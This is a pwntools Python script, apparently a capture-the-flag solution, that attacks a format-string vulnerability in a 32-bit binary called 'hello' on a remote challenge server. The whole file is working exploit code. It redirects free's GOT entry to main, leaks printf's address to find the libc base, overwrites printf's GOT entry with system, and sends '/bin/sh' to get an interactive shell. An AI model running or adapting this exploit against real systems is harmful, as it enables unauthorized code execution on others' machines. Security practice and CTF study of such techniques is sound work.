#!/usr/bin/python3

from pwn import *

binary = ELF('./hello')
context.update(arch='i386',os='linux')

#p = process(binary.path)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = remote('chall.csivit.com', 30046)
libc = ELF('libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so')

offset = 1

# 1st stage: free -> main for inf. 'free' rides
p.sendlineafter('name?\n', fmtstr_payload(offset,{binary.got.free:binary.sym.main}))

# 2nd stage: leak libc address
payload  = b'%' + str(offset+2).encode().rjust(2,b'0') + b'$004s'
payload += p32(binary.got.printf)
p.sendlineafter('name?\n', payload)
p.recvuntil('Hello, ')
_ = p.recv(4).lstrip()
printf = u32(_ + (4-len(_))*b'\x00')
log.info('printf ' + hex(printf))
baselibc = printf - libc.sym.printf
log.info('baselibc ' + hex(baselibc))
libc.address = baselibc

# 3nd stage, printf -> system
p.sendlineafter('name?\n', fmtstr_payload(offset,{binary.got.printf:libc.sym.system}))

# 4rd stage, ask for a shell
p.sendlineafter('name?\n', '/bin/sh')
p.recvuntil('not found') # now that printf is system, system('Hello, ') will emit 'not found'

p.interactive()
